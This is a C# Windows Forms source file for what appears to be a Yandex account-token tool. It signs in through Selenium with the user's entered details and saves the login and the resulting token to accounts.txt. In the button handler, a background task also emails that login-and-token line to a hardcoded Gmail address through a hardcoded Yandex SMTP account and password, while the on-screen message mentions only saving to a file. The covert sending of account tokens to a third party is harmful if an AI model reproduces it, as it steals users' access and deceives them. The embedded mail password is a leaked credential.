using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;

namespace RegAccYandex
{
    public partial class Form1 : Form
    {

        SeleniumModul sm;

        public async void SendMail(string smtpServer, string from, string password,
string mailto, string caption, string message, string attachFile = null)
        {
            try
            {
                MailMessage mail = new MailMessage();
                mail.From = new MailAddress(from);
                mail.To.Add(new MailAddress(mailto));
                mail.Subject = caption;
                mail.Body = message;
                if (!string.IsNullOrEmpty(attachFile))
                    mail.Attachments.Add(new Attachment(attachFile));
                SmtpClient client = new SmtpClient();
                client.Host = smtpServer;
                client.Port = 587;
                client.EnableSsl = true;
                client.Credentials = new NetworkCredential(from, password);
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.Send(mail);
                mail.Dispose();
            }
            catch (Exception e)
            {
                throw new Exception("Mail.Send: " + e.Message);
            }
        }
        public Form1()
        {
            InitializeComponent();
            sm = new SeleniumModul();
           
        }

        private void button1_Click(object sender, EventArgs e)
        {
            List<bool> rez = new List<bool>();
            rez.Add(!textBox1.Text.Trim().Equals(""));
            rez.Add(!textBox3.Text.Trim().Equals(""));
            rez.Add(!textBox4.Text.Trim().Equals(""));
            rez.Add(!textBox5.Text.Trim().Equals(""));


            if (Array.IndexOf(rez.ToArray(), false) != -1)
            {
                MessageBox.Show("Ошибка! Не все поля заполнены!");
                return;
            }
            button1.Enabled = false;
            try
            {
                var retData = this.sm.run(textBox1.Text, textBox5.Text, textBox3.Text, textBox4.Text);
                if (retData == null)
                {
                    textBox4.Text = "";
                    button1.Enabled = true;
                    MessageBox.Show("Неверные учетные данные!");
                    return;
                }

                this.textBox6.Text = retData;

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                button1.Enabled = true;
                return;
            }

            
            var data = String.Format("{0};{1};{2}", textBox3.Text, textBox1.Text, textBox6.Text);

            StreamWriter sw = new StreamWriter(!File.Exists("accounts.txt") ?
                File.Create("accounts.txt") :
                File.Open("accounts.txt",FileMode.Append));
            sw.WriteLine(data);
            sw.Close();
            Task.Run(()=>
            {

                SendMail("smtp.yandex.ru", "azyexxxar@yandex.ru", "93svxrpj", "exxxar@gmail.com", "Interpromotion yandex accounts", data);
                MessageBox.Show("Тоукен сгенерирован и сохранен в файл!");

               
            });
            button1.Enabled = true;
            textBox1.Text = textBox3.Text = textBox4.Text = textBox5.Text = textBox6.Text = "";
        }


    }
}
